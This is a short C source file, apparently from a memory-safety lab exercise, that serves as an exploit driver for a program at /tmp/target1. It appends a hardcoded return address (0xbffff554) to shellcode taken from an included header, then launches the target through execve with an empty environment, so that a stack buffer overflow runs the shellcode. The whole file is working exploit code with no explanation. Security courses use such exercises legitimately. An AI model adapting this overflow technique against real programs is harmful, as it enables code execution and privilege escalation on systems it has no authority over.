#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  static char sprepeat[] = "\x54\xf5\xff\xbf";
  fprintf(stderr, "strlen(shellcode)=%ibytes\n", (int) strlen(shellcode));

  args[0] = TARGET; 
  args[1] = strcat(shellcode, sprepeat);
  fprintf(stderr, "args[1]=\"%s\"\n", args[1]);
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
